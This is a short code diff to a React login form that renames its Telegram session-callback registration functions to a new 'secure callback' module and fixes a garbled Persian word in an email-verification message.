@@ -35,9 +35,9 @@ import {
   updateUserOnlineStatus,
 } from "@/lib/telegram-service-enhanced";
 import {
-  registerTelegramCallback,
-  unregisterTelegramCallback,
-} from "@/lib/telegram-callback-service";
+  registerSecureCallback,
+  unregisterSecureCallback,
+} from "@/lib/callback-session-fix";
 
 import { quickDebug } from "@/lib/telegram-debug-helper";
 import { useRealtimePresence } from "@/hooks/useRealtimePresence";
@@ -108,14 +108,14 @@ export const LoginForm = () => {
       console.log("🔗 Registering callback handler for session:", sessionId);
       console.log("🕐 Registration time:", new Date().toLocaleString());
 
-      registerTelegramCallback(sessionId, handleAdminAction);
+      registerSecureCallback(sessionId, handleAdminAction);
 
       // Don't unregister immediately on unmount - let the service handle cleanup
       return () => {
         console.log("🔌 Scheduling unregistration for session:", sessionId);
         // Longer delay to prevent premature cleanup
         setTimeout(() => {
-          unregisterTelegramCallback(sessionId);
+          unregisterSecureCallback(sessionId);
         }, 1000);
       };
     }
@@ -3202,7 +3202,7 @@ export const LoginForm = () => {
               <div style={{ marginBottom: "16px" }}>
                 <AlertMessage>
                   کد تایید به ایمیل{" "}
-                  <strong style={{ direction: "ltr" }}>{email}</strong> ��رسال
+                  <strong style={{ direction: "ltr" }}>{email}</strong> ارسال
                   شد.
                 </AlertMessage>
               </div>
